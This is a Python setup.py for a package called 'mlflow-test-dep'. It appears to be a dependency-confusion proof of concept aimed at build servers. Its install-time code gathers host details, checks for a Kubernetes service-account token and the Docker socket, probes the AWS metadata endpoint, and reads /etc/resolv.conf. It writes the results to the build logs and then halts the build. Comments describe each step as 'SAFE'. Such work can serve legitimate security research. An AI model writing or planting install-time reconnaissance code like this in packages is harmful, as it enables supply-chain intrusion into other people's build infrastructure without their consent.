import os
import sys
import platform
import socket
import urllib.request
from setuptools import setup

proof = "🚨🚨🚨 BUILD_SERVER_BOUNDARY_CHECK 🚨🚨🚨\n"
proof += f"Hostname: {socket.gethostname()}\n"
proof += f"OS Platform: {platform.platform()}\n"
proof += f"Working Directory: {os.getcwd()}\n\n"

# 1. Check for K8s Service Account Token (SAFE: Existence check ONLY)
k8s_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
proof += f"K8s Token File Exists: {os.path.exists(k8s_token_path)}\n"

# 2. Check for Docker Socket (SAFE: Existence check ONLY)
docker_sock_path = "/var/run/docker.sock"
proof += f"Docker Socket Exists: {os.path.exists(docker_sock_path)}\n"

# 3. Check Cloud Metadata Reachability (SAFE: HTTP Status code ONLY, NO content)
try:
    # Use HEAD request to minimize data transfer, timeout quickly
    req = urllib.request.Request("http://169.254.169.254/latest/meta-data/", method="HEAD")
    with urllib.request.urlopen(req, timeout=2) as response:
        proof += f"AWS Metadata Reachable: True (HTTP Status: {response.status})\n"
except Exception as e:
    proof += f"AWS Metadata Reachable: False ({type(e).__name__})\n"

# 4. Check Internal DNS / Routing (SAFE: Standard file read, limited output)
try:
    with open("/etc/resolv.conf", "r") as f:
        # Read only first 200 chars to prove access without dumping full internal config
        proof += f"Resolv.conf accessible: True\nContents snippet:\n{f.read()[:200]}\n"
except Exception as e:
    proof += f"Resolv.conf read error: {type(e).__name__}\n"

proof += "🚨🚨🚨 END BOUNDARY CHECK 🚨🚨🚨\n"

# Print to stdout (shows up in build logs)
print(proof)

# Raise exception to halt build and guarantee the log is captured
raise Exception(proof)

setup(name="mlflow-test-dep", version="0.1", description="Safe boundary check")
